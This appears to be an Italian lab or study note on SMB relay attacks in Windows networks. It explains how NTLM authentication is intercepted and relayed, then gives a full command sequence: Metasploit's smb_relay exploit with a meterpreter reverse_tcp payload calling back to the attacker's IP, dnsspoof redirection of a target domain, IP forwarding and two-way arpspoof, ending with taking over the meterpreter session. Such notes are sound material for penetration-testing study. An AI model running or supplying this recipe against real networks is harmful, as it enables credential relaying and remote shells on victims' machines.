Questo tipo di **attacco** è **comune** nelle **reti** **Windows**, dove viene utilizzato **SMB**.
per la **condivisione** file, **stampanti** e altri servizi di rete.

- Un attacco SMB relay è un tipo di attacco di rete in cui un **aggressore**
**intercetta** il **traffico** **SMB** (Server Message Block), **lo manipola** e **lo ritrasmette**
**a un server legittimo** per **ottenere** un **accesso** non autorizzato alle **risorse** o
eseguire azioni dannose.

### Come funzionano gli attacchi SMB Relay

- **Intercettazione:** L'aggressore crea una posizione **man-in-the-middle** tra il client e il server. Ciò può essere fatto utilizzando varie tecniche, come **ARP spoofing**, **DNS poisoning** o la **creazione** di un **server** **SMB non autorizzato**.
- **Cattura dell'autenticazione:** Quando un client si connette a un server legittimo tramite
SMB, invia dati di autenticazione. L'aggressore cattura questi dati, che potrebbero includere gli **hash di NTLM** (NT LAN Manager).
- **Inoltro a un server legittimo**: Invece di decifrare l'hash **NTLM** catturato, l'aggressore lo **inoltra** a un **altro server** che si fida della fonte. In questo modo **l'aggressore può impersonare
l'utente il cui hash è stato catturato.**
- **Ottenere l'accesso:** Se il relay ha successo, l'attaccante può ottenere **l'accesso** alle **risorse** del **server**, che potrebbero includere file sensibili, database o privilegi amministrativi. Questo accesso **potrebbe portare** a ulteriori **spostamenti laterali** all'interno della rete, compromettendo altri sistemi.

![image](https://github.com/user-attachments/assets/c0fedea0-771b-40ca-970b-a5999c2cebf6)

SVOLGIMENTO

1. **use exploit/windows/smb/smb_relay** configuriamo l’exploit che servirà per dopo
    1. **set SRVHOST MIO_IP**
    2. **set PAYLOAD windows/meterpreter/reverse_tcp**
    3. **set LHOST MIO_IP**
    4. **set SMBHOST IP_TARGET**
    5. r**un**

APRIAMO UN ALTRO TERMINALE

1. **echo "MIO_IP *.DOMINIO_TARGET > dns** creiamo un fake file contenente i sottodomini ****per reindirizzare la vittima al nostro sistema Metasploit ogni volta che si verifica una connessione SMB a qualsiasi host del dominio target. 
2. **dnsspoof -i eth1 -f dns** avviamo lo spoofing 

APRIAMO UN ALTRO TERMINALE

1. **echo 1 > /proc/sys/net/ipv4/ip_forward** abilitiamo l’ip forwarding per permettere l’ARP spoofing
2. **arpspoof -i eth1 -t IP_TARGET IP_GATAWAY_TARGET** (es: arpspoof -i eth1 -t 172.16.5.5 172.16.5.1) prima fase di 2 per avviare attacco arp spoofing

APRIAMO UN ALTRO TERMINALE

1. **arpspoof -i eth1 -t IP_GATAWAY_TARGET IP_TARGET** (arpspoof -i eth1 -t 172.16.5.1 172.16.5.5) seconda fase di 2 per avviare attacco arp spoofing

ORA QUANDO IL TARGET EFFETTUERA’ UNA CONNESSIONE SMB IL NOSTRO 1° TERMINALE CON METASPLOIT CATTURERA’ L’NTLM E AVVIERA’ UNA SESSIONE METERPRETER

1. **sessions** 
2. **sessions N** scegliamo al sessione meterpreter

****
